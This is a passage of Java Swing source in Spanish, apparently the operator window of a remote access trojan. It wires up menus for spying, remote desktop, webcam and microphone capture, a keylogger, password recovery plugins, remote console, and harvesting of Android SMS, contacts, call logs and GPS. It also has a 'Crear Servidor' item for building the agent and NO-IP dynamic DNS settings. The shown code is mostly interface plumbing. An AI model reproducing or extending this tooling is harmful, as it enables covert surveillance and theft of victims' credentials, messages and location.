        modelo.insertNodeInto(nodoClipboard, nodoAdministrar, 3);
        modelo.insertNodeInto(nodoProcesos, nodoAdministrar, 4);
        modelo.insertNodeInto(nodoConexiones, nodoAdministrar, 5);
        modelo.insertNodeInto(nodoComunicacion, nodoRoot, 3);
        modelo.insertNodeInto(nodoChat, nodoComunicacion, 0);
        modelo.insertNodeInto(nodoPlugins, nodoRoot, 4);
        modelo.insertNodeInto(nodoPlugWC, nodoPlugins, 0);
        modelo.insertNodeInto(nodoPlugNirsoft, nodoPlugins, 1);
        modelo.insertNodeInto(nodoAndroid, nodoRoot, 5);
        modelo.insertNodeInto(nodoGPS, nodoAndroid, 0);
        modelo.insertNodeInto(nodoSMS, nodoAndroid, 1);
        modelo.insertNodeInto(nodoLlamadas, nodoAndroid, 2);
        modelo.insertNodeInto(nodoContactos, nodoAndroid, 3);
        arbolOpciones.getSelectionModel().setSelectionMode(TreeSelectionModel.SINGLE_TREE_SELECTION);
        arbolOpciones.addTreeSelectionListener(new TreeSelectionListener() {
            @Override
            public void valueChanged(TreeSelectionEvent e) {
                DefaultMutableTreeNode node = (DefaultMutableTreeNode) arbolOpciones.getLastSelectedPathComponent();
                if (node == null) {
                    return;
                }
                String texto = (String) node.getUserObject();
                switch (texto) {
                    case "Opciones":
                        break;
                    case "Espiar":
                        break;
                    case "Escritorio Remoto":
                        escritorioRemotoAP(null);
                        break;
                    case "Cámara":
                        camaraAP(null);
                        break;
                    case "VoIP":
                        capturarMicrofonoPerformed(null);
                        break;
                    case "Administrar":
                        break;
                    case "Archivos":
                        administrarArchivosActionPerformed(null);
                        break;
                    case "Consola":
                        consolaAP(null);
                        break;
                    case "Portapapeles":
                        portapapelesAP(null);
                        break;
                    case "Procesos":
                        procesosAP(null);
                        break;
                    case "Conexiones":
                        conexionesAP(null);
                        break;
                    case "Plugins":
                        break;
                    case "WebCam":
                        enviarPluginsWebCam(null);
                        break;
                    case "NirSoft":
                        enviarPluginsNirSoft(null);
                        break;
                    case "Información":
                        infoAP(null);
                        break;
                    case "SMS":
                        abrirSMSActionPerformed(null);
                        break;
                    case "Contactos":
                        abrirContactosActionPerformed(null);
                        break;
                    case "Llamadas":
                        abrirLlamadasActionPerformed(null);
                        break;
                    case "Chat":
                        chatAP(null);
                        break;
                    case "GPS":
                        abrirGPSActionPerformed(null);
                        break;
                }
            }
        });
//        arbolOpciones.setLargeModel(true);
        for (int i = 0; i < arbolOpciones.getRowCount(); i++) {
            try {
                arbolOpciones.expandRow(i);
            } catch (Exception e) {
            }
        }
        JScrollPane scrollOpciones = new JScrollPane();
        scrollOpciones.setViewportView(arbolOpciones);
        vistaPrevia = new JLabel();
        vistaPrevia.setPreferredSize(new Dimension(250, 160));
        vistaPrevia.setMinimumSize(new Dimension(200, 100));
        vistaPrevia.setBackground(Color.CYAN);
        this.chkVistaPrevia = new JCheckBox();
        this.chkVistaPrevia.setText("Escritorio");
        this.chkVistaPreviaWC = new JCheckBox();
        this.chkVistaPreviaWC.setText("WebCam");
        this.chkVistaPreviaWCAndroid = new JCheckBox();
        this.chkVistaPreviaWCAndroid.setText("Solo android?");
        chkVistaPreviaWCAndroid.setToolTipText("Las Previas de WebCam es solo para android?");

        chkGuardarMiniaturas = new JCheckBox();
        this.chkGuardarMiniaturas.setText("Guardar");
        chkGuardarMiniaturas.setToolTipText("Guarda las miniaturas");

        segundos = new JSpinner();
        this.segundos.setModel(new SpinnerNumberModel(30, 0, 120, 1));
        this.segundos.addChangeListener(new ChangeListener() {
            @Override
            public void stateChanged(ChangeEvent evt) {
                try {
                    cliente.getConfig().setSegundos(Integer.parseInt(segundos.getValue().toString()));
                } catch (Exception e) {
                }
            }
        });
        JToolBar barraVistaPrevia = new JToolBar();
        barraVistaPrevia.setFloatable(false);
        barraVistaPrevia.add(chkVistaPreviaWC);
        barraVistaPrevia.addSeparator();
        barraVistaPrevia.add(chkVistaPreviaWCAndroid);
        JToolBar barraVistaPrevia2 = new JToolBar();
        barraVistaPrevia2.setFloatable(false);
        barraVistaPrevia2.add(chkVistaPrevia);
        barraVistaPrevia2.addSeparator();
        barraVistaPrevia2.add(chkGuardarMiniaturas);

        JToolBar barraVistaPrevia3 = new JToolBar();
        barraVistaPrevia3.setFloatable(false);
        barraVistaPrevia3.add(GuiUtil.crearJLabel("Intervalo seg:", "Intervalo de solicitud de las miniaturas"));
        barraVistaPrevia3.addSeparator();
        barraVistaPrevia3.add(segundos);

        JPanel panelOpcionesVistaPrevia = new JPanel();
        panelOpcionesVistaPrevia.setLayout(new BorderLayout());
        panelOpcionesVistaPrevia.add(barraVistaPrevia, BorderLayout.NORTH);
        panelOpcionesVistaPrevia.add(barraVistaPrevia2, BorderLayout.CENTER);
        panelOpcionesVistaPrevia.add(barraVistaPrevia3, BorderLayout.SOUTH);
        JPanel panelVistaPrevia = new JPanel();
        panelVistaPrevia.setLayout(new BorderLayout());
        panelVistaPrevia.add(vistaPrevia, BorderLayout.CENTER);
        panelVistaPrevia.add(panelOpcionesVistaPrevia, BorderLayout.SOUTH);
        JSplitPane splitPanelInfo = new JSplitPane(JSplitPane.VERTICAL_SPLIT, panelVistaPrevia, scrollOpciones);
//        splitPanelInfo.setTopComponent(panelVistaPrevia);
//        splitPanelInfo.setBottomComponent(scrollOpciones);
        panelInfo = new JPanel();
        panelInfo.setLayout(new BorderLayout());
        panelInfo.add(splitPanelInfo, BorderLayout.CENTER);
//        panelInfo.add(txtLog, BorderLayout.SOUTH);
//        this.panelInfo.setBorder(BorderFactory.createTitledBorder(null, "Información", 0, 0, new Font(tipoLetra, 1, 12), new Color(0, 102, 51)));
//        this.panelInfo.setBorder(BorderFactory.createTitledBorder(null, "Información", 0, 0, new Font(tipoLetra, 1, 12), null));
//        this.panelInfo.setBorder(BorderFactory.createTitledBorder(null, "Información", 0, 0, null, null));
        panelInfo.setMinimumSize(new Dimension(200, 250));

        equipos = new PanelEquipos();
        equipos.iniciar(ppmnuServer);

        contenedorPrincipal = new JPanel();
        contenedorPrincipal.setLayout(new GridLayout(1, 1));
        contenedorPrincipal.add(equipos);

        JSplitPane splitPane = new JSplitPane();
        splitPane.setLeftComponent(panelInfo);
        splitPane.setRightComponent(contenedorPrincipal);
        panelUsuarios = new JPanel();
        panelUsuarios.setLayout(new BorderLayout());
        panelUsuarios.add(splitPane, BorderLayout.CENTER);
        //tab transferencias v2

        //TAB DESCARGAS
        panelTransferencias = new JPanel();
        panelTransferencias.setLayout(new BorderLayout());
        this.jscrollTransferencias = new JScrollPane();
        paneTransferencia = new JTextPane();
        paneTransferencia.setEditable(false);
        this.jscrollTransferencias.setViewportView(paneTransferencia);
        this.btnDescargasAbrir = new JButton();
        this.btnDescargasAbrir.setText("Carpeta Servidores");
        this.btnDescargasAbrir.setIcon(Util.cargarIcono16("/resources/folder.png"));
        this.btnDescargasAbrir.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                cliente.btnDescargasAbrirCarpeta(evt);
            }
        });
        this.btnEliminarCompletos = new JButton();
        this.btnEliminarCompletos.setText("Eliminar Completos");
        this.btnEliminarCompletos.setIcon(Util.cargarIcono16("/resources/delete.png"));
        this.btnEliminarCompletos.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                cliente.btnTerminarCompletosAP(evt);
            }
        });

        chkCerrarAlTerminar = new JCheckBox("Cerrar al terminar");
        JToolBar ba = new JToolBar();
        ba.setFloatable(false);
        ba.add(btnDescargasAbrir);
        ba.add(btnEliminarCompletos);
        ba.add(chkCerrarAlTerminar);
        panelTransferencias.add(jscrollTransferencias, BorderLayout.CENTER);
        panelTransferencias.add(ba, BorderLayout.SOUTH);
        //panel info
//###############################################################################################################3
//                            Perfiles
//###############################################################################################################3
        this.scrollTablaPerfiles = new JScrollPane();
        tblPerfiles = new JTable();
        tblPerfiles.setShowGrid(false);
//        this.tabla.setComponentPopupMenu(this.menu);
        this.tblPerfiles.setAutoCreateRowSorter(true);
//        this.tblPerfiles.setFont(new Font(tipoLetra, 1, 14));
        this.tblPerfiles.setModel(new DefaultTableModel(new Object[0][], new String[]{"", "Nombre", "Puerto", "Tipo", "Versión Objetos", "SSL"}) {
            boolean[] canEdit = {false, false, false, false, false, false};

            @Override
            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });
        this.tblPerfiles.getColumnModel().getColumn(0).setMinWidth(20);
        this.tblPerfiles.getColumnModel().getColumn(0).setPreferredWidth(20);
        this.tblPerfiles.getColumnModel().getColumn(0).setMaxWidth(20);
        this.tblPerfiles.getColumnModel().getColumn(0).setCellRenderer(new CeldaIcono());

        this.scrollTablaPerfiles.setViewportView(this.tblPerfiles);
        JButton btnActualizar = new JButton();
        btnActualizar.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        btnActualizar.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
//                cliente.agregarPerfil();
                cliente.cargarPerfiles();
                cliente.actualizarListaPerfiles();
            }
        });
        JButton btnAgregarPerfil = new JButton();
        btnAgregarPerfil.setIcon(Util.cargarIcono16("/resources/add.png"));
        btnAgregarPerfil.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                btnCrearServidorActionPerformed(evt);
            }
        });
        JButton btnEliminarPerfil = new JButton();
        btnEliminarPerfil.setIcon(Util.cargarIcono16("/resources/delete.png"));
        btnEliminarPerfil.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                cliente.eliminarPerfil();
            }
        });
        JPanel pnlOpciones = new JPanel();
        JToolBar barraPerfil = new JToolBar();
        barraPerfil.setFloatable(false);
        barraPerfil.add(btnActualizar);
        barraPerfil.add(btnAgregarPerfil);
        barraPerfil.add(btnEliminarPerfil);
        pnlOpciones.setLayout(new BorderLayout());
        pnlOpciones.add(barraPerfil, BorderLayout.NORTH);
        panelPerfil = new JPanel();
        this.panelPerfil.setLayout(new BorderLayout());
        this.panelPerfil.add(scrollTablaPerfiles, BorderLayout.CENTER);
        this.panelPerfil.add(pnlOpciones, BorderLayout.EAST);
//###############################################################################################################3
//                      PANEL DE Configuración
//###############################################################################################################3

        this.pnlConfiguracion = new Config(cliente);
        this.tabs.addTab("Equipos", Util.cargarIcono16("/resources/computer.png"), this.panelUsuarios);
        this.tabs.addTab("Perfiles / Puertos", Util.cargarIcono16("/resources/person.png"), this.panelPerfil);
        this.tabs.addTab("NO-IP", Util.cargarIcono16("/resources/noip.png"), this.panelNoIp);
//        this.tabs.addTab("Transferencias", Util.cargarIcono16("/resources/transfer.png"), this.panelTransferencias);
        this.tabs.addTab("Transferencias", Util.cargarIcono16("/resources/transfer.png"), Global.transferencias);
        this.tabs.addTab("Configuración", Util.cargarIcono16("/resources/runcmd.png"), this.pnlConfiguracion.getContentPane());
        this.scrollLog = new JScrollPane();
        txtLog = new JTextArea("");
        scrollLog.setMaximumSize(new Dimension(this.getWidth(), 100));
        scrollLog.setPreferredSize(new Dimension(this.getWidth(), 100));
        this.scrollLog.setViewportView(txtLog);
//        barraEstado = new JToolBar();
//        barraEstado.setFloatable(false);
        barraEstado = new BarraEstado();
        barraEstado.add(Global.transferencias.progresoDescargas);
        barraEstado.add(Global.transferencias.progresoCarga);
        barraEstado.agregarContador(cliente.getContadorBajada());
        barraEstado.agregarContador(cliente.getContadorTotalBajada());
        barraEstado.agregarContador(cliente.getContadorSubida());
        barraEstado.agregarContador(cliente.getContadorTotalSubida());
        barraEstado.agregarRamInfo();
        panelInferior = new JPanel();
        panelInferior.setLayout(new BorderLayout());
        panelInferior.add(scrollLog, BorderLayout.CENTER);
        panelInferior.add(barraEstado, BorderLayout.SOUTH);
        this.setLayout(new BorderLayout());
        this.add(barra, BorderLayout.NORTH);
        this.add(tabs, BorderLayout.CENTER);
        this.add(panelInferior, BorderLayout.SOUTH);
        this.setResizable(true);
        this.setVisible(true);

        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setIconImage(Util.cargarIcono16("/resources/remote.png").getImage());
        ////  BARRA DE MENU
//        menuBar = new JMenuBar();
        menuControl = new JMenu();
        menuControl.setText("Control");
        this.menuControl.setIcon(Util.cargarIcono16("/resources/controlpanel.png"));
        itmCrearServidor = new JMenuItem();
        this.itmCrearServidor.setIcon(Util.cargarIcono16("/resources/server.png"));
        this.itmCrearServidor.setLabel("Crear Servidor");// setText("Crear Asociado");
        this.itmCrearServidor.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                btnCrearServidorActionPerformed(evt);
            }
        });
        menuControl.add(itmCrearServidor);
//        menuBar.add(menuControl);
//        this.setJMenuBar(menuBar);
        this.addWindowListener(new WindowListener() {
            @Override
            public void windowOpened(WindowEvent e) {
            }

            @Override
            public void windowClosing(WindowEvent e) {
                try {
                    cliente.getConfig().setNoIpPassword(panelNoIp.getTxtNoIpPass().getText());
                    cliente.getConfig().setNoIpUsuario(panelNoIp.getTxtNoIpUsuario().getText());
                    cliente.getConfig().setVistasPrevias(chkVistaPrevia.isSelected());
                    cliente.getConfig().setRutaArchivo(pnlConfiguracion.getTxtRutaArchivo().getText());
                    cliente.getConfig().setVersion(pnlConfiguracion.getTxtVersion().getText());
                    cliente.getConfig().setActualizarserver(pnlConfiguracion.getChkActualizarserver().isSelected());
                    cliente.getConfig().setPedirArchivoOffline(pnlConfiguracion.getChkPedirArchivoOffline().isSelected());
                    cliente.getConfig().agregarParametro("iniciarArranque", pnlConfiguracion.getIniciarArranque().isSelected());
                    cliente.getConfig().agregarParametro("clave", Encriptacion.cifra(pnlConfiguracion.getTxtPassword().getText()));
                    cliente.getConfig().agregarParametro("vistaPreviaWC", chkVistaPreviaWC.isSelected());
                    cliente.getConfig().agregarParametro("vistaPreviaWCAndroid", chkVistaPreviaWCAndroid.isSelected());
                    cliente.getConfig().agregarParametro("ipsbloqueadas", pnlConfiguracion.getTxtIps().getText());
                    cliente.getConfig().agregarParametro("notificacion", pnlConfiguracion.getChkNotificar().isSelected());
                    cliente.getConfig().agregarParametro("guardarminiaturas", chkGuardarMiniaturas.isSelected());

                    SerializarUtil.escribirArchivo(cliente.getConfig(), "config.dat");
                } catch (Exception ex) {
                }
            }

            @Override
            public void windowClosed(WindowEvent e) {
            }

            @Override
            public void windowIconified(WindowEvent e) {
            }

            @Override
            public void windowDeiconified(WindowEvent e) {
            }

            @Override
            public void windowActivated(WindowEvent e) {
            }

            @Override
            public void windowDeactivated(WindowEvent e) {
            }
        });

        GuiUtil.centrarVentana(this, 1000, 600);
    }

    public JTree getArbolOpciones() {
        return arbolOpciones;
    }

    public void setArbolOpciones(JTree arbolOpciones) {
        this.arbolOpciones = arbolOpciones;
    }

    public JToolBar getBarra() {
        return barra;
    }

    public void setBarra(JToolBar barra) {
        this.barra = barra;
    }

    public JButton getBtnCrearAgente() {
        return btnCrearAgente;
    }

    public void setBtnCrearAgente(JButton btnCrearAgente) {
        this.btnCrearAgente = btnCrearAgente;
    }

    public JButton getBtnAcerca() {
        return btnAcerca;
    }

    public void setBtnAcerca(JButton btnAcerca) {
        this.btnAcerca = btnAcerca;
    }

    public JButton getBtnAgregarAgente() {
        return btnAgregarAgente;
    }

    public void setBtnAgregarAgente(JButton btnAgregarAgente) {
        this.btnAgregarAgente = btnAgregarAgente;
    }

    public JButton getBtnEscritorioRemoto() {
        return btnEscritorioRemoto;
    }

    public void setBtnEscritorioRemoto(JButton btnEscritorioRemoto) {
        this.btnEscritorioRemoto = btnEscritorioRemoto;
    }

    public JButton getBtnCamara() {
        return btnCamara;
    }

    public void setBtnCamara(JButton btnCamara) {
        this.btnCamara = btnCamara;
    }

    public JButton getBtnAdminArchivos() {
        return btnAdminArchivos;
    }

    public void setBtnAdminArchivos(JButton btnAdminArchivos) {
        this.btnAdminArchivos = btnAdminArchivos;
    }

    public JButton getBtnConsola() {
        return btnConsola;
    }

    public void setBtnConsola(JButton btnConsola) {
        this.btnConsola = btnConsola;
    }

    public JButton getBtnMicrofono() {
        return btnMicrofono;
    }

    public void setBtnMicrofono(JButton btnMicrofono) {
        this.btnMicrofono = btnMicrofono;
    }

    public JButton getBtnMensaje() {
        return btnMensaje;
    }

    public void setBtnMensaje(JButton btnMensaje) {
        this.btnMensaje = btnMensaje;
    }

    public JButton getBtnIniciar() {
        return btnIniciar;
    }

    public void setBtnIniciar(JButton btnIniciar) {
        this.btnIniciar = btnIniciar;
    }

    public JButton getBtnArchivosOfflineVisor() {
        return btnArchivosOfflineVisor;
    }

    public void setBtnArchivosOfflineVisor(JButton btnArchivosOfflineVisor) {
        this.btnArchivosOfflineVisor = btnArchivosOfflineVisor;
    }

    public JPanel getContenedorPrincipal() {
        return contenedorPrincipal;
    }

    public void setContenedorPrincipal(JPanel contenedorPrincipal) {
        this.contenedorPrincipal = contenedorPrincipal;
    }

    public JPopupMenu getPpmnuServer() {
        return ppmnuServer;
    }

    public void setPpmnuServer(JPopupMenu ppmnuServer) {
        this.ppmnuServer = ppmnuServer;
    }

    public JMenu getMenuAgente() {
        return menuAgente;
    }

    public void setMenuAgente(JMenu menuAgente) {
        this.menuAgente = menuAgente;
    }

    public JMenu getMenuApagar() {
        return menuApagar;
    }

    public void setMenuApagar(JMenu menuApagar) {
        this.menuApagar = menuApagar;
    }

    public JMenu getMenuControlserver() {
        return menuControlAgente;
    }

    public void setMenuControlserver(JMenu menuControlserver) {
        this.menuControlAgente = menuControlserver;
    }

    public JMenuItem getItmAbrirUrl() {
        return itmAbrirUrl;
    }

    public void setItmAbrirUrl(JMenuItem itmAbrirUrl) {
        this.itmAbrirUrl = itmAbrirUrl;
    }

    public JMenuItem getItmBuscarIp() {
        return itmBuscarIp;
    }

    public void setItmBuscarIp(JMenuItem itmBuscarIp) {
        this.itmBuscarIp = itmBuscarIp;
    }

    public JMenuItem getItmEscritorioRemoto() {
        return itmEscritorioRemoto;
    }

    public void setItmEscritorioRemoto(JMenuItem itmEscritorioRemoto) {
        this.itmEscritorioRemoto = itmEscritorioRemoto;
    }

    public JMenuItem getItmCamara() {
        return itmCamara;
    }

    public void setItmCamara(JMenuItem itmCamara) {
        this.itmCamara = itmCamara;
    }

    public JMenuItem getItmAdminArchivos() {
        return itmAdminArchivos;
    }

    public void setItmAdminArchivos(JMenuItem itmAdminArchivos) {
        this.itmAdminArchivos = itmAdminArchivos;
    }

    public JMenuItem getItmProcesos() {
        return itmProcesos;
    }

    public void setItmProcesos(JMenuItem itmProcesos) {
        this.itmProcesos = itmProcesos;
    }

    public JMenuItem getItmConexiones() {
        return itmConexiones;
    }

    public void setItmConexiones(JMenuItem itmConexiones) {
        this.itmConexiones = itmConexiones;
    }

    public JMenuItem getItmInfo() {
        return itmInfo;
    }

    public void setItmInfo(JMenuItem itmInfo) {
        this.itmInfo = itmInfo;
    }

    public JMenuItem getItmPortaPapeles() {
        return itmPortaPapeles;
    }

    public void setItmPortaPapeles(JMenuItem itmPortaPapeles) {
        this.itmPortaPapeles = itmPortaPapeles;
    }

    public JMenuItem getItmKeyLogger() {
        return itmKeyLogger;
    }

    public void setItmKeyLogger(JMenuItem itmKeyLogger) {
        this.itmKeyLogger = itmKeyLogger;
    }

    public JMenuItem getItmConsola() {
        return itmConsola;
    }

    public void setItmConsola(JMenuItem itmConsola) {
        this.itmConsola = itmConsola;
    }

    public JMenuItem getItmChat() {
        return itmChat;
    }

    public void setItmChat(JMenuItem itmChat) {
        this.itmChat = itmChat;
    }

    public JMenuItem getItmReiniciarEquipo() {
        return itmReiniciarEquipo;
    }

    public void setItmReiniciarEquipo(JMenuItem itmReiniciarEquipo) {
        this.itmReiniciarEquipo = itmReiniciarEquipo;
    }

    public JMenuItem getItmApagarEquipo() {
        return itmApagarEquipo;
    }

    public void setItmApagarEquipo(JMenuItem itmApagarEquipo) {
        this.itmApagarEquipo = itmApagarEquipo;
    }

    public JMenuItem getItmReiniciarAgente() {
        return itmReiniciarAgente;
    }

    public void setItmReiniciarAgente(JMenuItem itmReiniciarAgente) {
        this.itmReiniciarAgente = itmReiniciarAgente;
    }

    public JMenuItem getItmApagarServidor() {
        return itmApagarServidor;
    }

    public void setItmApagarServidor(JMenuItem itmApagarServidor) {
        this.itmApagarServidor = itmApagarServidor;
    }

    public JMenuItem getItmEnviarPlgInWC() {
        return itmEnviarPlgInWC;
    }

    public void setItmEnviarPlgInWC(JMenuItem itmEnviarPlgInWC) {
        this.itmEnviarPlgInWC = itmEnviarPlgInWC;
    }

    public JMenuItem getItmEnviarPlgInJNA() {
        return itmEnviarPlgInJNA;
    }

    public void setItmEnviarPlgInJNA(JMenuItem itmEnviarPlgInJNA) {
        this.itmEnviarPlgInJNA = itmEnviarPlgInJNA;
    }

    public JMenuItem getItmEnviarPlgInKL() {
        return itmEnviarPlgInKL;
    }

    public void setItmEnviarPlgInKL(JMenuItem itmEnviarPlgInKL) {
        this.itmEnviarPlgInKL = itmEnviarPlgInKL;
    }

    public JMenuItem getItmEnviarPlgNirsoft() {
        return itmEnviarPlgNirsoft;
    }

    public void setItmEnviarPlgNirsoft(JMenuItem itmEnviarPlgNirsoft) {
        this.itmEnviarPlgNirsoft = itmEnviarPlgNirsoft;
    }

    public JMenuItem getItmCapturarMicrofono() {
        return itmCapturarMicrofono;
    }

    public void setItmCapturarMicrofono(JMenuItem itmCapturarMicrofono) {
        this.itmCapturarMicrofono = itmCapturarMicrofono;
    }

    public JMenuItem getItmActualizarServidor() {
        return itmActualizarServidor;
    }

    public void setItmActualizarServidor(JMenuItem itmActualizarServidor) {
        this.itmActualizarServidor = itmActualizarServidor;
    }

    public JMenuItem getItmActualizarServidorOtro() {
        return itmActualizarServidorOtro;
    }

    public void setItmActualizarServidorOtro(JMenuItem itmActualizarServidorOtro) {
        this.itmActualizarServidorOtro = itmActualizarServidorOtro;
    }

    public JMenuItem getItmDesinstalarServidor() {
        return itmDesinstalarServidor;
    }

    public void setItmDesinstalarServidor(JMenuItem itmDesinstalarServidor) {
        this.itmDesinstalarServidor = itmDesinstalarServidor;
    }

    public JMenuItem getItmPing() {
        return itmPing;
    }

    public void setItmPing(JMenuItem itmPing) {
        this.itmPing = itmPing;
    }

    public JMenuItem getItmPasswords() {
        return itmPasswords;
    }

    public void setItmPasswords(JMenuItem itmPasswords) {
        this.itmPasswords = itmPasswords;
    }

    public JMenuItem getItmMsgBox() {
        return itmMsgBox;
    }

    public void setItmMsgBox(JMenuItem itmMsgBox) {
        this.itmMsgBox = itmMsgBox;
    }

    public JMenu getMenuPC() {
        return menuPC;
    }

    public void setMenuPC(JMenu menuPC) {
        this.menuPC = menuPC;
    }

    public JMenu getMenuAndroid() {
        return menuAndroid;
    }

    public void setMenuAndroid(JMenu menuAndroid) {
        this.menuAndroid = menuAndroid;
    }

    public JMenuItem getItmAndroidGPS() {
        return itmAndroidGPS;
    }

    public void setItmAndroidGPS(JMenuItem itmAndroidGPS) {
        this.itmAndroidGPS = itmAndroidGPS;
    }

    public JMenuItem getItmAndroidContactos() {
        return itmAndroidContactos;
    }

    public void setItmAndroidContactos(JMenuItem itmAndroidContactos) {
        this.itmAndroidContactos = itmAndroidContactos;
    }

    public JMenuItem getItmAndroidSMS() {
        return itmAndroidSMS;
    }

    public void setItmAndroidSMS(JMenuItem itmAndroidSMS) {
        this.itmAndroidSMS = itmAndroidSMS;
    }

    public JMenuItem getItmAndroidLlamadas() {
        return itmAndroidLlamadas;
    }

    public void setItmAndroidLlamadas(JMenuItem itmAndroidLlamadas) {
        this.itmAndroidLlamadas = itmAndroidLlamadas;
    }

    public JMenuItem getItmArchivosOffline() {
        return itmArchivosOffline;
    }

    public void setItmArchivosOffline(JMenuItem itmArchivosOffline) {
        this.itmArchivosOffline = itmArchivosOffline;
    }

    public JMenuItem getItmArchivosOfflineVisor() {
        return itmArchivosOfflineVisor;
    }

    public void setItmArchivosOfflineVisor(JMenuItem itmArchivosOfflineVisor) {
        this.itmArchivosOfflineVisor = itmArchivosOfflineVisor;
    }

    public JMenuItem getItmListarRedLan() {
        return itmListarRedLan;
    }

    public void setItmListarRedLan(JMenuItem itmListarRedLan) {
        this.itmListarRedLan = itmListarRedLan;
    }

    public NoIp getPanelNoIp() {
        return panelNoIp;
    }

    public void setPanelNoIp(NoIp panelNoIp) {
        this.panelNoIp = panelNoIp;
    }

//    public JLabel getLbNoIpUsuario() {
//        return lbNoIpUsuario;
//    }
//
//    public void setLbNoIpUsuario(JLabel lbNoIpUsuario) {
//        this.lbNoIpUsuario = lbNoIpUsuario;
//    }
//
//    public JLabel getLbNoIpPass() {
//        return lbNoIpPass;
//    }
//
//    public void setLbNoIpPass(JLabel lbNoIpPass) {
//        this.lbNoIpPass = lbNoIpPass;
//    }
//    public JLabel getLblEstadoNoIp() {
//        return lblEstadoNoIp;
//    }
//
//    public void setLblEstadoNoIp(JLabel lblEstadoNoIp) {
//        this.lblEstadoNoIp = lblEstadoNoIp;
//    }
    public JTabbedPane getTabs() {
        return tabs;
    }

    public void setTabs(JTabbedPane tabs) {
        this.tabs = tabs;
    }

    public JPanel getPanelUsuarios() {
        return panelUsuarios;
    }

    public void setPanelUsuarios(JPanel panelUsuarios) {
        this.panelUsuarios = panelUsuarios;
    }

    public JPanel getPanelTransferencias() {
        return panelTransferencias;
    }

    public void setPanelTransferencias(JPanel panelTransferencias) {
        this.panelTransferencias = panelTransferencias;
    }

    public JButton getBtnDescargasAbrir() {
        return btnDescargasAbrir;
    }

    public void setBtnDescargasAbrir(JButton btnDescargasAbrir) {
        this.btnDescargasAbrir = btnDescargasAbrir;
    }

    public JButton getBtnEliminarCompletos() {
        return btnEliminarCompletos;
    }

    public void setBtnEliminarCompletos(JButton btnEliminarCompletos) {
        this.btnEliminarCompletos = btnEliminarCompletos;
    }

    public JScrollPane getJscrollTransferencias() {
        return jscrollTransferencias;
    }

    public void setJscrollTransferencias(JScrollPane jscrollTransferencias) {
        this.jscrollTransferencias = jscrollTransferencias;
    }

    public JMenu getMenuControl() {
        return menuControl;
    }

    public void setMenuControl(JMenu menuControl) {
        this.menuControl = menuControl;
    }

    public JMenuItem getItmCrearServidor() {
        return itmCrearServidor;
    }

    public void setItmCrearServidor(JMenuItem itmCrearServidor) {
        this.itmCrearServidor = itmCrearServidor;
    }

    public JPanel getPanelInfo() {
        return panelInfo;
    }

    public void setPanelInfo(JPanel panelInfo) {
        this.panelInfo = panelInfo;
    }

    public JLabel getVistaPrevia() {
        return vistaPrevia;
    }

    public void setVistaPrevia(JLabel vistaPrevia) {
        this.vistaPrevia = vistaPrevia;
    }

    public JCheckBox getChkVistaPrevia() {
        return chkVistaPrevia;
    }

    public void setChkVistaPrevia(JCheckBox chkVistaPrevia) {
        this.chkVistaPrevia = chkVistaPrevia;
    }

    public JCheckBox getChkVistaPreviaWC() {
        return chkVistaPreviaWC;
    }

    public void setChkVistaPreviaWC(JCheckBox chkVistaPreviaWC) {
        this.chkVistaPreviaWC = chkVistaPreviaWC;
    }

    public JCheckBox getChkVistaPreviaWCAndroid() {
        return chkVistaPreviaWCAndroid;
    }

    public void setChkVistaPreviaWCAndroid(JCheckBox chkVistaPreviaWCAndroid) {
        this.chkVistaPreviaWCAndroid = chkVistaPreviaWCAndroid;
    }

    public JTextArea getTxtLog() {
        return txtLog;
    }

    public void setTxtLog(JTextArea txtLog) {
        this.txtLog = txtLog;
    }

    public JScrollPane getScrollLog() {
        return scrollLog;
    }

    public void setScrollLog(JScrollPane scrollLog) {
        this.scrollLog = scrollLog;
    }

    public JTable getTblPerfiles() {
        return tblPerfiles;
    }

    public void setTblPerfiles(JTable tblPerfiles) {
        this.tblPerfiles = tblPerfiles;
    }

    public JScrollPane getScrollTablaPerfiles() {
        return scrollTablaPerfiles;
    }

    public void setScrollTablaPerfiles(JScrollPane scrollTablaPerfiles) {
        this.scrollTablaPerfiles = scrollTablaPerfiles;
    }

    public JPanel getPanelPerfil() {
        return panelPerfil;
    }

    public void setPanelPerfil(JPanel panelPerfil) {
        this.panelPerfil = panelPerfil;
    }

    public JSpinner getSegundos() {
        return segundos;
    }

    public void setSegundos(JSpinner segundos) {
        this.segundos = segundos;
    }

    public String getServerSeleccionado() {
        return serverSeleccionado;
    }

    public void setServerSeleccionado(String serverSeleccionado) {
        this.serverSeleccionado = serverSeleccionado;
    }

    public JPanel getPanelInferior() {
        return panelInferior;
    }

    public void setPanelInferior(JPanel panelInferior) {
        this.panelInferior = panelInferior;
    }

    public BarraEstado getBarraEstado() {
        return barraEstado;
    }

    public void setBarraEstado(BarraEstado barraEstado) {
        this.barraEstado = barraEstado;
    }

    public JCheckBox getChkCerrarAlTerminar() {
        return chkCerrarAlTerminar;
    }

    public void setChkCerrarAlTerminar(JCheckBox chkCerrarAlTerminar) {
        this.chkCerrarAlTerminar = chkCerrarAlTerminar;
    }

    public Config getPnlConfiguracion() {
        return pnlConfiguracion;
    }

    public void setPnlConfiguracion(Config pnlConfiguracion) {
        this.pnlConfiguracion = pnlConfiguracion;
    }

    /**
     * Listar los dns registrados en no-ip
     *
     * @param evt
     */
    public void btnListarDNSActionPerformed(ActionEvent evt) {

    }

    public void btnActualizarIpExterna(ActionEvent evt) {

    }

    public void mostrarMiniatura(Asociado server) {
        try {
            if (server != null) {
                if (!server.isAndroid()) {
                    if (this.getChkVistaPrevia().isSelected()) {
                        this.getVistaPrevia().setIcon(new ImageIcon(server.getVistaPreviaEscritorio().getImage().getScaledInstance(this.getVistaPrevia().getWidth(), this.getVistaPrevia().getHeight(), Image.SCALE_SMOOTH)));
                    } else {
